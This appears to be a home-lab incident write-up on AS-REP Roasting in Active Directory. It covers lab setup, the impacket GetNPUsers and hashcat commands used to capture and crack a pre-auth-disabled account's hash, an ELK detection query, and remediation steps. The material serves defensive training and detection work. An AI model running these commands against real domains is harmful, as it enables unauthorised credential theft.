# INC-002 — AS-REP Roasting

> **Status:** ✅ Completed — 2026-08-12
> **MITRE ATT&CK:** [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
> **Tactic:** Credential Access
> **Tool:** Impacket `GetNPUsers.py` + Hashcat
> **Difficulty:** Low — no prior credentials required

---

## Overview

AS-REP Roasting exploits Active Directory accounts that have Kerberos pre-authentication disabled (`DoesNotRequirePreAuth = true`). When pre-auth is disabled, the Domain Controller will respond to a TGT request from **any unauthenticated user** with an AS-REP encrypted using the target account's password hash. This encrypted blob can be taken offline and cracked without ever triggering an account lockout.

**Why it matters:** Zero prior access required. One misconfigured account is enough. Common in real environments due to legacy app compatibility settings left in place.

---

## Lab Environment

| Component | Value |
|-----------|-------|
| Domain | `soc.lab` |
| DC Hostname | `SOC-Lab-DC` (172.16.0.5) |
| Attacker | Kali Linux (172.16.0.11) |
| Vulnerable Account | `svc_asrep` |
| Account Password | `<LAB_PASSWORD>` — intentionally weak, rockyou-confirmed. **Lab use only.** |
| Detection | Event ID 4768 + TicketEncryptionType 0x17 |

---

## Prerequisites Checklist

- [x] **Check 1** — Vulnerable AD user with `DoesNotRequirePreAuth = true`
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName
  ```
- [x] **Check 2** — Kerberos audit policy: `Success and Failure`
  ```cmd
  auditpol /get /subcategory:"Kerberos Authentication Service"
  ```
- [x] **Check 3** — Winlogbeat shipping Security channel, `winlogbeat-*` index active
  - Config: `C:\winlogbeat\winlogbeat.yml` (non-default path)
- [x] **Check 4** — Clock skew DC ↔ Kali < 5 minutes
  - Chrony installed on Kali, synced to 172.16.0.5, offset `0.000002620s`

---

## Setup

```powershell
# Run on DC as Administrator
New-ADUser -Name "svc_asrep" -SamAccountName "svc_asrep" `
  -UserPrincipalName "svc_asrep@soc.lab" -Enabled $true `
  -AccountPassword (ConvertTo-SecureString "<LAB_PASSWORD>" -AsPlainText -Force) `
  -PasswordNeverExpires $true

Set-ADAccountControl -Identity "svc_asrep" -DoesNotRequirePreAuth $true
```

> ⚠️ Use a rockyou.txt-confirmed password (e.g. `Password1`) so the crack step is reproducible. Label the AD account description: `"LAB ACCOUNT — intentionally vulnerable — DO NOT replicate in production"`

---

## Attack Execution

### Step 1 — Enumerate & Capture Hash (Kali)

```bash
impacket-GetNPUsers soc.lab/svc_asrep -no-pass -dc-ip 172.16.0.5
```

**Output:**
```
$krb5asrep$23$svc_asrep@SOC.LAB:<HASH_REDACTED>
```

The `$23$` = RC4-HMAC (etype `0x17`) — Impacket's default downgrade, and the primary detection signal.

### Step 2 — Offline Crack (Kali)

```bash
hashcat -m 18200 '<HASH_REDACTED>' /usr/share/wordlists/rockyou.txt --force
```

**Result:** `Status: Cracked` — recovered in seconds. No lockout. No AD interaction.

> 💡 If rockyou.txt is gzipped: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Detection

### ELK Query

```kql
event.code: "4768" AND winlog.event_data.TicketEncryptionType: "0x17"
```

### Key Fields from Live Event

| Field | Value | Significance |
|-------|-------|--------------|
| `event.code` | `4768` | Kerberos TGT requested |
| `TicketEncryptionType` | `0x17` | RC4 — attacker downgrade |
| `PreAuthType` | `0` | Pre-auth was absent |
| `TargetUserName` | `svc_asrep` | Targeted account |
| `IpAddress` | `::ffff:172.16.0.11` | Kali — attacker source |
| `agent.name` | `SOC-Lab-DC` | Confirmed on live DC |
| `_index` | `winlogbeat-2026.08.12` | ELK index confirmed |

### Sigma Rule

[`detection/sigma/T1558.004-asrep-roasting.yml`](../../detection/sigma/T1558.004-asrep-roasting.yml)

---

## Indicators of Compromise

See: [iocs.md](./iocs.md)

---

## Remediation

See: [`playbooks/lab-hardening.md`](../../playbooks/lab-hardening.md) — AD Section, INC-002

```powershell
# Immediate fix
Set-ADAccountControl -Identity svc_asrep -DoesNotRequirePreAuth $false

# Audit all vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select Name, SamAccountName

# Long-term: disable RC4 via GPO
# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options
# → Network security: Configure encryption types allowed for Kerberos → AES128/AES256 only
```
